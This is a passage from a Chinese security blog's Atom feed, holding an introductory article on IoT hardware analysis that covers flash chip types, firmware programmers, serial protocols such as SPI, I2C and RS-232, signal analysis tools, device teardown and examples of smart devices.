      <category term="远程代码执行" scheme="http://www.future-sec.com/tags/%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>物联网硬件安全分析基础-硬件分析初探</title>
    <link href="http://www.future-sec.com/iot-security-hardware-analysis.html"/>
    <id>http://www.future-sec.com/iot-security-hardware-analysis.html</id>
    <published>2017-11-16T16:00:00.000Z</published>
    <updated>2018-06-29T10:45:35.148Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当我们在分析IOT设备，如智能摄像头、智能门锁、智能路由器等等产品时，采用传统的安全检测手段，如对APP的逆向、云端服务器的渗透测试、产品通信的抓包等方式可以获得部分的信息，但如果需要深入分析智能设备底层的工作原理，从中发现更深层次的安全问题，就不可避免的需要直接接触硬件本身，这也是传统安全手段未能触及的部分，据此，下面简单的谈下关于电路分析和芯片固件提取和调试的一点心得。</p>
<h2 id="芯片"><a href="#芯片" class="headerlink" title="芯片"></a>芯片</h2><h3 id="ROM芯片"><a href="#ROM芯片" class="headerlink" title="ROM芯片"></a>ROM芯片</h3><p>常见的IOT产品，一般采用嵌入式linux系统开发，对芯片分析主要目的之一就是获取到硬件系统的固件，从固件中分析可能存在的安全风险。<br>固件一般存储在ROM中，ROM是只读存储器（Read-Only Memory）的简称，是一种只能读出事先所存数据的固态半导体存储器。其特性是一旦储存资料就无法再将之改变或删除。通常用在不需经常变更资料的电子或电脑系统中，并且资料不会因为电源关闭而消失。<br>常见的存储芯片按照存储读取方式和制作工艺不同，可以分为： ROM、PROM、EPROM、EEPROM、FLASH-ROM。<br>在大部分IOT产品中多采用flash芯片作为存储器，提取固件主要也是通过读取flash芯片。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image17.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image18.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image19.jpg" alt=""></p>
<h3 id="Flash芯片"><a href="#Flash芯片" class="headerlink" title="Flash芯片"></a>Flash芯片</h3><p>FLASH ROM属于真正的单电压芯片，在使用上很类似EEPROM，因此，有些书籍上便把FLASH ROM作为EEPROM的一种。事实上，二者还是有差别的。FLASH ROM在擦除时，也要执行专用的刷新程序，但是在删除资料时，并非以Byte为基本单位，而是以Sector（又称Block）为最小单位，Sector 的大小随厂商的不同而有所不同；只有在写入时，才以Byte为最小单位写入；FLASH ROM芯片的读和写操作都是在单电压下进行，不需跳线，只利用专用程序即可方便地修改其内容；FLASH ROM的存储容量普遍大于EEPROM，约为512K到至8M KBit，由于大批量生产，价格也比较合适，很适合用来存放程序码，近年来已逐渐取代了EEPROM，广泛用于主板的BIOS ROM，也是CIH攻击的主要目标。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image20.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image21.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image22.jpg" alt=""></p>
<p>根据技术方式不同可分为： IIC EEPROM、SPI NorFlash 、CFI Flash、Parallel NandFlash、SPI NandFlash、eMMC Flash、USF2.0等。<br>其中SPI NorFlash因为接口简单，使用的引脚少，易于连接，操作方便，并且可以在芯片上直接运行代码，其稳定性出色，传输速率高，在小容量时具有很高的性价比，这使其很适合应于嵌入式系统中作为 FLASH ROM，所以在市场的占用率非常高。<br>我们通常见到的S25FL128、MX25L1605、W25Q64等型号都是SPI NorFlash，其常见的封装多为SOP8，SOP16，WSON8，US0N8，QFN8、BGA24等。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image23.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image24.jpg" alt=""></p>
<h3 id="芯片印字"><a href="#芯片印字" class="headerlink" title="芯片印字"></a>芯片印字</h3><p> 一般PCB上有多块逻辑处理IC，在多个IC芯片中，可以通过分析电路原理和查找芯片印字来确定具体的存储芯片。<br> 芯片上的丝印大多数情况会注明厂商和芯片型号，通过印字可以初步确定芯片类型，同时丝印层的文字也可以帮助我们来确定存储的格式和大小，常见的W25芯片的印字含义如下：</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image25.jpg" alt=""></p>
<h2 id="编程器"><a href="#编程器" class="headerlink" title="编程器"></a>编程器</h2><p>读取Flash芯片，需要借助编程器，编程器又称烧录器、写入器、写码器，是专门用来对IC芯片进行读写、编程/烧录的仪器。并口多功能BIOS编程器，它可以对EPROM（27系列芯片）、EEPROM（28系列芯片）、FLASH ROM（29、39、49系列芯片）及单片机、串行芯片等进行读写、编程，是一种性价比较高的编程器。<br>编程器种类多样，从功能简单的专用型到功能全面的全功能通用型都有，价格从几十元到上万元不等。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image26.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image27.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image28.jpg" alt=""></p>
<h2 id="通信协议"><a href="#通信协议" class="headerlink" title="通信协议"></a>通信协议</h2><p>串口通信指串口按位（bit）发送和接收字节。尽管比按字节（byte）的并行通信慢，但是串口可以在使用一根线发送数据的同时用另一根线接收数据。在串口通信中，常用的协议包括RS-232、RS-422和RS-485。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image29.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image30.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image31.jpg" alt=""></p>
<h3 id="RS-232"><a href="#RS-232" class="headerlink" title="RS-232"></a>RS-232</h3><p>通信方式允许简单连接三线：Tx、Rx和地线。但是对于数据传输，双方必须对数据定时采用使用相同的波特率。</p>
<h3 id="RS-422"><a href="#RS-422" class="headerlink" title="RS-422"></a>RS-422</h3><p>RS-422标准全称是“平衡电压数字接口电路的电气特性”，在RS232后推出，使用TTL差动电平表示逻辑，就是两根的电压差表示逻辑，RS422定义为全双工的，所以最少要4根通信线（一般额外地多一根地线）。</p>
<h3 id="RS-485"><a href="#RS-485" class="headerlink" title="RS-485"></a>RS-485</h3><p> RS485是一个定义平衡数字多点系统中的驱动器和接收器的电气特性的标准，RS-485与RS-422的区别在于RS-485为半双工通信方式，RS-422为全双工方式。RS-422用两对平衡差分信号线分别用于发送和接收，所以采用RS-422接口通信时最少需要4根线。RS-485只用一对平衡差分信号线，不能同时发送和接收，最少只需两根连线。</p>
<h3 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h3><p> spi是串行外设接口（Serial Peripheral Interface）的缩写。SPI，是一种高速的，全双工，同步的通信总线，并且在芯片的管脚上只占用四根线，节约了芯片的管脚，同时为PCB的布局上节省空间，提供方便，正是出于这种简单易用的特性，如今越来越多的芯片集成了这种通信协议，比如AT91RM9200。</p>
<h3 id="I2C"><a href="#I2C" class="headerlink" title="I2C"></a>I2C</h3><p> I2C 即Inter-Integrated Circuit(集成电路总线），这种总线类型是由飞利浦半导体公司在八十年代初设计出来的一种简单、双向、二线制、同步串行总线，主要是用来连接整体电路(ICS) ，IIC是一种多向控制总线，也就是说多个芯片可以连接到同一总线结构下，同时每个芯片都可以作为实时数据传输的控制源。这种方式简化了信号传输总线接口。</p>
<h2 id="信号分析"><a href="#信号分析" class="headerlink" title="信号分析"></a>信号分析</h2><h3 id="示波器分析"><a href="#示波器分析" class="headerlink" title="示波器分析"></a>示波器分析</h3><p>示波器是一种用途十分广泛的电子测量仪器。它能把肉眼看不见的电信号变换成看得见的图像，便于人们研究各种电现象的变化过程。示波器利用狭窄的、由高速电子组成的电子束，打在涂有荧光物质的屏面上，就可产生细小的光点（这是传统的模拟示波器的工作原理）。在被测信号的作用下，电子束就好像一支笔的笔尖，可以在屏面上描绘出被测信号的瞬时值的变化曲线。利用示波器能观察各种不同信号幅度随时间变化的波形曲线，还可以用它测试各种不同的电量，如电压、电流、频率、相位差、调幅度等等。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/IMG_3237.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/IMG_3239.jpg" alt=""></p>
<p>通过分析电路结构，找到待测的引脚和信号源，分析其信号变化和具体的信号形式,得到模拟信号和经过外部AD转换信号的波形图。</p>
<h3 id="逻辑分析仪"><a href="#逻辑分析仪" class="headerlink" title="逻辑分析仪"></a>逻辑分析仪</h3><p>逻辑分析仪是分析数字系统逻辑关系的仪器。逻辑分析仪是属于数据域测试[2]仪器中的一种总线分析仪，即以总线（多线）概念为基础，同时对多条数据线上的数据流进行观察和测试的仪器，这种仪器对复杂的数字系统的测试和分析十分有效。逻辑分析仪是利用时钟从测试设备上采集和显示数字信号的仪器，最主要作用在于时序判定。由于逻辑分析仪不像示波器那样有许多电压等级，通常只显示两个电压（逻辑1和0），因此设定了参考电压后，逻辑分析仪将被测信号通过比较器进行判定，高于参考电压者为High,低于参考电压者为Low，在High与 Low之间形成数字波形。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b34d5b3314fe.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b34d8d59bfb5.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b34d5c7b5319.jpg" alt=""></p>
<p>通过连接待测设备的接口，分析其中通信数据，通过协议转码，可以得到具体的16进制数据。</p>
<h2 id="设备拆解"><a href="#设备拆解" class="headerlink" title="设备拆解"></a>设备拆解</h2><p>对于一台未接触过的机器，拆解首先需要观察其外部结构，是否存在暴露的螺丝孔，如果没有，一般可能隐藏在贴纸或橡胶垫下面，可以用手感受是否存在空洞，部分机器采用卡榫结构，只要找对方向，用一字螺丝刀或撬片，从缝隙中就可以撬开，拆解设备唯一的要诀就是胆大心细。部分常用工具如下：</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image104.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b2d3ac1a60b9.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b2d3ac7644b8.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/5b2d3ad527734.jpg" alt=""></p>
<p>维修组合套装，用来拆装各类螺丝，PCB夹用来拔出排线，热风枪和焊台用来拆焊各类元器件和芯片，BGA焊台用于拆焊BGA封装的芯片。</p>
<h2 id="常见物联网智能设备"><a href="#常见物联网智能设备" class="headerlink" title="常见物联网智能设备"></a>常见物联网智能设备</h2><p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image105.jpg" alt=""></p>
<p>共享充电宝，采用gprs模块配合物联卡与云端通信</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image106.jpg" alt=""></p>
<p>蓝牙挂锁，通过蓝牙芯片与手机配对通信，<br>蓝牙控制电机驱动，使卡锁运转</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image107.jpg" alt=""></p>
<p>共享充电宝，采用GSM模块加蓝牙模块控制通信</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image108.jpg" alt=""></p>
<p>智能锁，WIFI芯片加蓝牙芯片配合控制，外接指纹识别传感器</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image109.jpg" alt=""></p>
<p>智能摄像头，采用WIFI芯片通信，外接音频、视频处理模块</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image110.jpg" alt=""></p>
<p>网络摄像机，采用网卡芯片，配合多口输出输入视频信号模块</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image111.jpg" alt=""></p>
<p>智能路由器，高容量内存搭配智能OS</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image112.jpg" alt=""></p>
<p>智能家居控制终端，高性能WIFI收发中继控制</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image113.jpg" alt=""></p>
<p>智能保险柜，采用WIFI芯片控制加指纹识别传感器</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/688535e77168b873/image114.jpg" alt=""></p>
<p>无线终端，采用4G模块和WIFI芯片，做便携式WIFI终端</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p> <a href="http://www.china-cic.cn/" rel="external nofollow noopener noreferrer" target="_blank">http://www.china-cic.cn/</a>  中国通信协会相关文献<br> <a href="https://www.eia.gov/" rel="external nofollow noopener noreferrer" target="_blank">https://www.eia.gov/</a>  美国电子工业协会相关标准</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;当我们在分析IOT设备，如智能摄像头、智能门锁、智能路由器等等产品时，采用传统的安全检测手段，如对APP的逆向、云端服务器的渗透测试、产品通
    
    </summary>
    
      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="硬件分析" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
